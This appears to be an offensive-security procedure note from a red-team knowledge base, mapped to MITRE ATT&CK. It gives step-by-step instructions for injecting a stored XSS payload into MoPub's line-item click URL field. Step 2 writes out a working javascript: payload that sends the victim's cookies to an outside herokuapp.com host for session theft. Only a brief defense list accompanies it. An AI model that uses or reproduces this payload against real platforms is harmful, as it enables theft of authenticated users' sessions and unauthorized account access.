---
id: proc-mopub-inject-xss-001
tags:
  - xss
  - javascript
  - injection
type: procedure
tools: []
tactics:
  - '[[Initial Access]]'
commands: []
verified: false
platforms:
  - Web
submitted: true
created_at: '2023-10-01T00:00:00Z'
techniques:
  - '[[Drive-by Compromise]]'
  - '[[JavaScript]]'
updated_at: '2025-12-14T03:46:37.927Z'
skill_level: intermediate
impact_level: medium
detection_risk: medium
sub_techniques: []
validated: true
mitre_tactics:
  - '[[Initial Access]]'
mitre_techniques:
  - '[[Drive-by Compromise]]'
  - '[[JavaScript]]'
---
# Inject-XSS-Payload-into-Click-URL

## Summary

This procedure injects a JavaScript payload into the click URL field of a MoPub link item, exploiting insufficient sanitization to allow execution during ad testing. It enables arbitrary code like cookie exfiltration in the victim's browser context.

## Description

The click URL field in MoPub's line item configuration accepts javascript: protocol handlers without proper validation, leading to reflected XSS when the ad is previewed or tested. This procedure edits an existing link item to insert payloads such as a simple alert for testing or an exfiltration script sending cookies to an attacker-controlled server. The attack scenario targets authenticated users (e.g., admins inviting others to shared inventories), with outcomes including session theft. It requires prior creation of the link item and uses the platform's UI; no external tools are needed, but a proxy like Burp can help inspect.

## Requirements

1. Existing link item from previous procedure
2. Authenticated access to edit line items at /advertise/line_items/
3. Attacker-controlled domain for exfiltration (e.g., herokuapp.com)

## Defense

Defensive measures and detection strategies:

- Sanitize click URL inputs to block javascript: and script tags
- Escape HTML/JS in ad preview rendering
- Log and alert on suspicious URL patterns in ad configs

## Objectives

1. Embed executable JavaScript in the click URL
2. Ensure payload survives saving and editing
3. Prepare for triggering via ad test

## Instructions

### Step 1: Edit the Link Item

**Context**: Open the configuration for the target link item to access the click URL field.

Navigate to https://app.mopub.com/advertise/line_items/, select the item, and click edit.

> This displays the form fields. Expected output: Editable interface loaded.

### Step 2: Insert the XSS Payload

**Context**: Set the click URL to a malicious javascript: handler.

Enter a payload like `javascript://%0a%0dalert(document.cookie)` for basic testing or `javascript://%0d%0a"><script>document.location="https://typose.herokuapp.com/lol.php#"+document.cookie</script>` for cookie exfiltration. Optionally, add an image URL for the link if tile type. Save the changes.

> Payload is accepted without error. Expected output: Item updated; reload to confirm persistence.

## MITRE ATT&CK Mapping

### Tactics

- [[Initial Access]] Initial Access

### Techniques

- [[Drive-by Compromise]] Drive-by Compromise
- [[JavaScript]] JavaScript

### Sub-Techniques


## Commands Used


## Tools Used


## Tags

- [[xss]]
- [[JavaScript]]
- [[injection]]
